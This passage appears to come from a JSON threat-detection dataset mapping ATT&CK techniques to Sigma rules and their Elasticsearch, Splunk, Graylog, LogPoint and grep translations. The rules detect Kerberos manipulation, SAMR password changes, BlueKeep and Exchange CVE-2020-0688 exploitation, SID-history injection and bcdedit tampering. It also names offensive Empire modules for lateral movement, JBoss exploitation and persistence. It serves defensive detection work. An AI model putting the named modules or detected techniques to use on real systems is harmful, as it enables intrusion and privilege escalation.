      - '0x1F'\n          - '0x21'\n          - '0x22'\n          - '0x23'\n          - '0x24'\n          - '0x26'\n          - '0x27'\n          - '0x28'\n          - '0x29'\n          - '0x2C'\n          - '0x2D'\n          - '0x2E'\n          - '0x2F'\n          - '0x31'\n          - '0x32'\n          - '0x3E'\n          - '0x3F'\n          - '0x40'\n          - '0x41'\n          - '0x43'\n          - '0x44'\n    condition: selection\nfalsepositives:\n    - Faulty legacy applications\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"675\" OR \"4768\" OR \"4769\" OR \"4771\") AND FailureCode:(\"0x9\" OR \"0xA\" OR \"0xB\" OR \"0xF\" OR \"0x10\" OR \"0x11\" OR \"0x13\" OR \"0x14\" OR \"0x1A\" OR \"0x1F\" OR \"0x21\" OR \"0x22\" OR \"0x23\" OR \"0x24\" OR \"0x26\" OR \"0x27\" OR \"0x28\" OR \"0x29\" OR \"0x2C\" OR \"0x2D\" OR \"0x2E\" OR \"0x2F\" OR \"0x31\" OR \"0x32\" OR \"0x3E\" OR \"0x3F\" OR \"0x40\" OR \"0x41\" OR \"0x43\" OR \"0x44\"))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Kerberos-Manipulation <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Kerberos Manipulation\",\\n    \"description\": \"This method triggers on rare Kerberos Failure Codes caused by manipulations of Kerberos messages\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1212\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"675\\\\\" OR \\\\\"4768\\\\\" OR \\\\\"4769\\\\\" OR \\\\\"4771\\\\\") AND FailureCode:(\\\\\"0x9\\\\\" OR \\\\\"0xA\\\\\" OR \\\\\"0xB\\\\\" OR \\\\\"0xF\\\\\" OR \\\\\"0x10\\\\\" OR \\\\\"0x11\\\\\" OR \\\\\"0x13\\\\\" OR \\\\\"0x14\\\\\" OR \\\\\"0x1A\\\\\" OR \\\\\"0x1F\\\\\" OR \\\\\"0x21\\\\\" OR \\\\\"0x22\\\\\" OR \\\\\"0x23\\\\\" OR \\\\\"0x24\\\\\" OR \\\\\"0x26\\\\\" OR \\\\\"0x27\\\\\" OR \\\\\"0x28\\\\\" OR \\\\\"0x29\\\\\" OR \\\\\"0x2C\\\\\" OR \\\\\"0x2D\\\\\" OR \\\\\"0x2E\\\\\" OR \\\\\"0x2F\\\\\" OR \\\\\"0x31\\\\\" OR \\\\\"0x32\\\\\" OR \\\\\"0x3E\\\\\" OR \\\\\"0x3F\\\\\" OR \\\\\"0x40\\\\\" OR \\\\\"0x41\\\\\" OR \\\\\"0x43\\\\\" OR \\\\\"0x44\\\\\"))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"675\\\\\" OR \\\\\"4768\\\\\" OR \\\\\"4769\\\\\" OR \\\\\"4771\\\\\") AND FailureCode:(\\\\\"0x9\\\\\" OR \\\\\"0xA\\\\\" OR \\\\\"0xB\\\\\" OR \\\\\"0xF\\\\\" OR \\\\\"0x10\\\\\" OR \\\\\"0x11\\\\\" OR \\\\\"0x13\\\\\" OR \\\\\"0x14\\\\\" OR \\\\\"0x1A\\\\\" OR \\\\\"0x1F\\\\\" OR \\\\\"0x21\\\\\" OR \\\\\"0x22\\\\\" OR \\\\\"0x23\\\\\" OR \\\\\"0x24\\\\\" OR \\\\\"0x26\\\\\" OR \\\\\"0x27\\\\\" OR \\\\\"0x28\\\\\" OR \\\\\"0x29\\\\\" OR \\\\\"0x2C\\\\\" OR \\\\\"0x2D\\\\\" OR \\\\\"0x2E\\\\\" OR \\\\\"0x2F\\\\\" OR \\\\\"0x31\\\\\" OR \\\\\"0x32\\\\\" OR \\\\\"0x3E\\\\\" OR \\\\\"0x3F\\\\\" OR \\\\\"0x40\\\\\" OR \\\\\"0x41\\\\\" OR \\\\\"0x43\\\\\" OR \\\\\"0x44\\\\\"))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Kerberos Manipulation\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"675\" \"4768\" \"4769\" \"4771\") AND FailureCode:(\"0x9\" \"0xA\" \"0xB\" \"0xF\" \"0x10\" \"0x11\" \"0x13\" \"0x14\" \"0x1A\" \"0x1F\" \"0x21\" \"0x22\" \"0x23\" \"0x24\" \"0x26\" \"0x27\" \"0x28\" \"0x29\" \"0x2C\" \"0x2D\" \"0x2E\" \"0x2F\" \"0x31\" \"0x32\" \"0x3E\" \"0x3F\" \"0x40\" \"0x41\" \"0x43\" \"0x44\"))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"675\" OR EventID=\"4768\" OR EventID=\"4769\" OR EventID=\"4771\") (FailureCode=\"0x9\" OR FailureCode=\"0xA\" OR FailureCode=\"0xB\" OR FailureCode=\"0xF\" OR FailureCode=\"0x10\" OR FailureCode=\"0x11\" OR FailureCode=\"0x13\" OR FailureCode=\"0x14\" OR FailureCode=\"0x1A\" OR FailureCode=\"0x1F\" OR FailureCode=\"0x21\" OR FailureCode=\"0x22\" OR FailureCode=\"0x23\" OR FailureCode=\"0x24\" OR FailureCode=\"0x26\" OR FailureCode=\"0x27\" OR FailureCode=\"0x28\" OR FailureCode=\"0x29\" OR FailureCode=\"0x2C\" OR FailureCode=\"0x2D\" OR FailureCode=\"0x2E\" OR FailureCode=\"0x2F\" OR FailureCode=\"0x31\" OR FailureCode=\"0x32\" OR FailureCode=\"0x3E\" OR FailureCode=\"0x3F\" OR FailureCode=\"0x40\" OR FailureCode=\"0x41\" OR FailureCode=\"0x43\" OR FailureCode=\"0x44\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"675\", \"4768\", \"4769\", \"4771\"] result_code IN [\"0x9\", \"0xA\", \"0xB\", \"0xF\", \"0x10\", \"0x11\", \"0x13\", \"0x14\", \"0x1A\", \"0x1F\", \"0x21\", \"0x22\", \"0x23\", \"0x24\", \"0x26\", \"0x27\", \"0x28\", \"0x29\", \"0x2C\", \"0x2D\", \"0x2E\", \"0x2F\", \"0x31\", \"0x32\", \"0x3E\", \"0x3F\", \"0x40\", \"0x41\", \"0x43\", \"0x44\"])", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*675|.*4768|.*4769|.*4771))(?=.*(?:.*0x9|.*0xA|.*0xB|.*0xF|.*0x10|.*0x11|.*0x13|.*0x14|.*0x1A|.*0x1F|.*0x21|.*0x22|.*0x23|.*0x24|.*0x26|.*0x27|.*0x28|.*0x29|.*0x2C|.*0x2D|.*0x2E|.*0x2F|.*0x31|.*0x32|.*0x3E|.*0x3F|.*0x40|.*0x41|.*0x43|.*0x44)))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Possible Remote Password Change Through SAMR\nid: 7818b381-5eb1-4641-bea5-ef9e4cfb5951\ndescription: Detects a possible remote NTLM hash change through SAMR API SamiChangePasswordUser() or SamSetInformationUser(). \"Audit User Account Management\" in \"Advanced\n    Audit Policy Configuration\" has to be enabled in your local security policy / GPO to see this events.\nauthor: Dimitrios Slamaris\ntags:\n    - attack.credential_access\n    - attack.t1212\nlogsource:\n    product: windows\n    service: security\ndetection:\n    samrpipe:\n        EventID: 5145\n        RelativeTargetName: samr\n    passwordchanged:\n        EventID: 4738\n    passwordchanged_filter:\n        PasswordLastSet: null\n    timeframe: 15s \n    condition: ( passwordchanged and not passwordchanged_filter ) | near samrpipe\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible Remote Password Change Through SAMR\nid: 7818b381-5eb1-4641-bea5-ef9e4cfb5951\ndescription: Detects a possible remote NTLM hash change through SAMR API SamiChangePasswordUser() or SamSetInformationUser(). \"Audit User Account Management\" in \"Advanced\n    Audit Policy Configuration\" has to be enabled in your local security policy / GPO to see this events.\nauthor: Dimitrios Slamaris\ntags:\n    - attack.credential_access\n    - attack.t1212\nlogsource:\n    product: windows\n    service: security\ndetection:\n    samrpipe:\n        EventID: 5145\n        RelativeTargetName: samr\n    passwordchanged:\n        EventID: 4738\n    passwordchanged_filter:\n        PasswordLastSet: null\n    timeframe: 15s \n    condition: ( passwordchanged and not passwordchanged_filter ) | near samrpipe\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Possible-Remote-Password-Change-Through-SAMR <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Possible Remote Password Change Through SAMR\",\\n    \"description\": \"Detects a possible remote NTLM hash change through SAMR API SamiChangePasswordUser() or SamSetInformationUser(). \\\\\"Audit User Account Management\\\\\" in \\\\\"Advanced Audit Policy Configuration\\\\\" has to be enabled in your local security policy / GPO to see this events.\",\\n    \"tags\": [\\n      \"attack.credential_access\",\\n      \"attack.t1212\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"4738\\\\\" AND (NOT (NOT _exists_:PasswordLastSet)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"15s\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"4738\\\\\" AND (NOT (NOT _exists_:PasswordLastSet)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Possible Remote Password Change Through SAMR\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "grep -P '^(?:.*(?=.*4738)(?=.*(?!.*(?:.*(?=.*(?!PasswordLastSet))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/jenkins_script_console", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/jenkins_script_console", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/exploit/web/jboss_jmx", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "python/exploit/web/jboss_jmx", "name": "Empire Module Command"}], "command_list": ["powershell/lateral_movement/jenkins_script_console", "powershell/lateral_movement/jenkins_script_console", "python/exploit/web/jboss_jmx", "python/exploit/web/jboss_jmx"], "technique_id": "T1190", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1190", "Empire Module": "powershell/lateral_movement/jenkins_script_console", "Technique": "Exploit Public-Facing Application", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/jenkins_script_console\":  [\"T1190\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1190", "Empire Module": "python/exploit/web/jboss_jmx", "Technique": "Exploit Public-Facing Application", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"python/exploit/web/jboss_jmx\":  [\"T1190\"],"}}], "queries": [{"query": "title: Potential RDP exploit CVE-2019-0708\nid: aaa5b30d-f418-420b-83a0-299cb6024885\ndescription: Detect suspicious error on protocol RDP, potential CVE-2019-0708\nreferences:\n    - https://github.com/zerosum0x0/CVE-2019-0708\n    - https://github.com/Ekultek/BlueKeep\ntags:\n    - attack.initial_access\n    - attack.lateral_movement\n    - attack.t1210\n    - attack.t1190\n    - car.2013-07-002\nstatus: experimental\nauthor: \"Lionel PRAT, Christophe BROCAS, @atc_project (improvements)\"\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: \n            - 56\n            - 50\n        Source: TermDD\n    condition: selection\nfalsepositives:\n    - Bad connections or network interruptions\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Potential RDP exploit CVE-2019-0708\nid: aaa5b30d-f418-420b-83a0-299cb6024885\ndescription: Detect suspicious error on protocol RDP, potential CVE-2019-0708\nreferences:\n    - https://github.com/zerosum0x0/CVE-2019-0708\n    - https://github.com/Ekultek/BlueKeep\ntags:\n    - attack.initial_access\n    - attack.lateral_movement\n    - attack.t1210\n    - attack.t1190\n    - car.2013-07-002\nstatus: experimental\nauthor: \"Lionel PRAT, Christophe BROCAS, @atc_project (improvements)\"\nlogsource:\n    product: windows\n    service: system\ndetection:\n    selection:\n        EventID: \n            - 56\n            - 50\n        Source: TermDD\n    condition: selection\nfalsepositives:\n    - Bad connections or network interruptions\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"56\" OR \"50\") AND Source:\"TermDD\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Potential-RDP-exploit-CVE-2019-0708 <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Potential RDP exploit CVE-2019-0708\",\\n    \"description\": \"Detect suspicious error on protocol RDP, potential CVE-2019-0708\",\\n    \"tags\": [\\n      \"attack.initial_access\",\\n      \"attack.lateral_movement\",\\n      \"attack.t1210\",\\n      \"attack.t1190\",\\n      \"car.2013-07-002\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"56\\\\\" OR \\\\\"50\\\\\") AND Source:\\\\\"TermDD\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"56\\\\\" OR \\\\\"50\\\\\") AND Source:\\\\\"TermDD\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Potential RDP exploit CVE-2019-0708\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"56\" \"50\") AND Source:\"TermDD\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"56\" OR EventID=\"50\") Source=\"TermDD\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" event_id IN [\"56\", \"50\"] Source=\"TermDD\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*56|.*50))(?=.*TermDD))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "Yml\ntitle: CVE-2020-0688 Exchange Exploitation via Web Log\nid: fce2c2e2-0fb5-41ab-a14c-5391e1fd70a5\nstatus: experimental\ndescription: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nreferences:\n\u00a0\u00a0\u00a0\u00a0- https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/\nauthor: Florian Roth\ndate: 2020/02/29\nlogsource:\n\u00a0\u00a0\u00a0\u00a0category: webserver\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cs-method: 'GET'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c-uri | contains:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '/ ecp /'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '/ owa /'\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c-uri | contains: '__VIEWSTATE ='\n\u00a0\u00a0\u00a0\u00a0condition: selection1 and selection2\nfields:\n\u00a0\u00a0\u00a0\u00a0- c-ip\n\u00a0\u00a0\u00a0\u00a0- c-dns\nfalsepositives:\n\u00a0\u00a0\u00a0\u00a0- Unknown\ntags:\n\u00a0\u00a0\u00a0\u00a0- attack.initial_access\n\u00a0\u00a0\u00a0\u00a0- attack.t1190\nlevel: critical", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: CVE-2020-0688 Exploitation via Eventlog\nid: d6266bf5-935e-4661-b477-78772735a7cb\nstatus: experimental\ndescription: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nreferences:\n\u00a0\u00a0\u00a0\u00a0- https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/\nauthor: Florian Roth\ndate: 2020/02/29\ntags:\n\u00a0\u00a0\u00a0\u00a0- attack.initial_access\n\u00a0\u00a0\u00a0\u00a0- attack.t1190\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: application\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 4\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Source: MSExchange Control Panel\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Level: Error\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0- '* & __ VIEWSTATE = *'\n\u00a0\u00a0\u00a0\u00a0condition: selection1 and selection2\nfalsepositives:\n\u00a0\u00a0\u00a0\u00a0- Unknown\nlevel: high", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}, {"query": "Yml\ntitle: CVE-2020-0688 Exploitation IIS Eventlog\nid: d6266bf5-935e-4661-b477-78772735a7cb\nstatus: experimental\ndescription: Detects the exploitation of Microsoft Exchange vulnerability as described in CVE-2020-0688\nreferences:\n\u00a0\u00a0\u00a0\u00a0- https://www.trustedsec.com/blog/detecting-cve-20200688-remote-code-execution-vulnerability-on-microsoft-exchange-server/\nauthor: Florian Roth\ndate: 2020/02/29\ntags:\n\u00a0\u00a0\u00a0\u00a0- attack.initial_access\n\u00a0\u00a0\u00a0\u00a0- attack.t1190\nlogsource:\n\u00a0\u00a0\u00a0\u00a0product: windows\n\u00a0\u00a0\u00a0\u00a0service: IIS\ndetection:\n\u00a0\u00a0\u00a0\u00a0selection1:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cs-method: 'POST'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c-uri | contains: '/owa/auth.owa'\n\u00a0\u00a0\u00a0\u00a0selection2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cs-method: 'GET'\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0c-uri | contains: '__VIEWSTATEGENERATOR = * __VIEWSTATE ='\n\u00a0\u00a0\u00a0\u00a0timeframe: 3s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: selection1 and selection2\nfalsepositives:\n\u00a0\u00a0\u00a0\u00a0- Unknown\nlevel: high", "product": "https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}", "name": "Yml"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/add_sid_history", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/misc/add_sid_history", "name": "Empire Module Command"}], "command_list": ["powershell/persistence/misc/add_sid_history", "powershell/persistence/misc/add_sid_history"], "technique_id": "T1178", "parsed_datasets": [{"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1178", "Empire Module": "powershell/persistence/misc/add_sid_history", "Technique": "SID-History Injection", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/persistence/misc/add_sid_history\":  [\"T1178\"],"}}], "queries": [{"query": "title: Addition of SID History to Active Directory Object\nid: 2632954e-db1c-49cb-9936-67d1ef1d17d2\nstatus: stable\ndescription: An attacker can use the SID history attribute to gain additional privileges.\nreferences:\n    - https://adsecurity.org/?p=1772\nauthor: Thomas Patzke, @atc_project (improvements)\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1178\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID:\n            - 4765\n            - 4766\n    selection2:\n        EventID: 4738\n    selection3:\n        SidHistory: \n            - '-'\n            - '%%1793'\n    condition: selection1 or (selection2 and not selection3)\nfalsepositives:\n    - Migration of an account into a new domain\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Addition of SID History to Active Directory Object\nid: 2632954e-db1c-49cb-9936-67d1ef1d17d2\nstatus: stable\ndescription: An attacker can use the SID history attribute to gain additional privileges.\nreferences:\n    - https://adsecurity.org/?p=1772\nauthor: Thomas Patzke, @atc_project (improvements)\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1178\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID:\n            - 4765\n            - 4766\n    selection2:\n        EventID: 4738\n    selection3:\n        SidHistory: \n            - '-'\n            - '%%1793'\n    condition: selection1 or (selection2 and not selection3)\nfalsepositives:\n    - Migration of an account into a new domain\nlevel: low", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:(\"4765\" OR \"4766\") OR (EventID:\"4738\" AND (NOT (SidHistory:(\"\\\\-\" OR \"%%1793\")))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Addition-of-SID-History-to-Active-Directory-Object <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Addition of SID History to Active Directory Object\",\\n    \"description\": \"An attacker can use the SID history attribute to gain additional privileges.\",\\n    \"tags\": [\\n      \"attack.persistence\",\\n      \"attack.privilege_escalation\",\\n      \"attack.t1178\"\\n    ],\\n    \"query\": \"(EventID:(\\\\\"4765\\\\\" OR \\\\\"4766\\\\\") OR (EventID:\\\\\"4738\\\\\" AND (NOT (SidHistory:(\\\\\"\\\\\\\\-\\\\\" OR \\\\\"%%1793\\\\\")))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:(\\\\\"4765\\\\\" OR \\\\\"4766\\\\\") OR (EventID:\\\\\"4738\\\\\" AND (NOT (SidHistory:(\\\\\"\\\\\\\\-\\\\\" OR \\\\\"%%1793\\\\\")))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Addition of SID History to Active Directory Object\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:(\"4765\" \"4766\") OR (EventID:\"4738\" AND (NOT (SidHistory:(\"\\\\-\" \"%%1793\")))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((EventID=\"4765\" OR EventID=\"4766\") OR (EventID=\"4738\" NOT ((SidHistory=\"-\" OR SidHistory=\"%%1793\"))))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_source=\"Microsoft-Windows-Security-Auditing\" (event_id IN [\"4765\", \"4766\"] OR (event_source=\"Microsoft-Windows-Security-Auditing\" event_id=\"4738\"  -(SidHistory IN [\"-\", \"%%1793\"]))))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*4765|.*4766)|.*(?:.*(?=.*4738)(?=.*(?!.*(?:.*(?=.*(?:.*-|.*%%1793))))))))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1067", "parsed_datasets": [], "queries": [{"query": "title: Possible Ransomware or unauthorized MBR modifications\nid: c9fbe8e9-119d-40a6-9b59-dd58a5d84429\nstatus: experimental\ndescription: Detects, possibly, malicious unauthorized usage of bcdedit.exe\nreferences:\n    - https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set\nauthor: '@neu5ron'\ndate: 2019/02/07\ntags:\n    - attack.defense_evasion\n    - attack.t1070\n    - attack.persistence\n    - attack.t1067\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        NewProcessName: '*\\bcdedit.exe'\n        ProcessCommandLine:\n            - '*delete*'\n            - '*deletevalue*'\n            - '*import*'\n    condition: selection\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Possible Ransomware or unauthorized MBR modifications\nid: c9fbe8e9-119d-40a6-9b59-dd58a5d84429\nstatus: experimental\ndescription: Detects, possibly, malicious unauthorized usage of bcdedit.exe\nreferences:\n    - https://docs.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set\nauthor: '@neu5ron'\ndate: 2019/02/07\ntags:\n    - attack.defense_evasion\n    - attack.t1070\n    - attack.persistence\n    - attack.t1067\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        NewProcessName: '*\\bcdedit.exe'\n        ProcessCommandLine:\n            - '*delete*'\n            - '*deletevalue*'\n            - '*import*'\n    condition: 